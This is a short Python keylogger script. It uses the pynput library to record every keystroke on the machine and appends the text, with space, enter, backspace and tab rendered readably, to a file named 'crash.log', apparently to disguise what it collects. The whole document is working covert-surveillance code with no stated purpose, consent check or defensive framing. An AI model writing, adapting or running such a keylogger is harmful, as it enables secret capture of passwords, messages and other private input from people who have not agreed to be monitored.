from pynput.keyboard import Listener
import re

fileLog = "crash.log"

def capture(key):
    key = str(key)
    key = re.sub(r"'", "", key)
    key = re.sub(r'Key.space', ' ', key)
    key = re.sub(r'Key.enter', '\n', key)
    key = re.sub(r'Key.backspace', '[bckspc]', key)
    key = re.sub(r'Key.tab', '  |  ', key)
    key = re.sub(r'Key.*', '', key)
    
    with open(fileLog, 'a') as log:
        log.write(key)

with Listener(on_press=capture) as l:
    l.join()        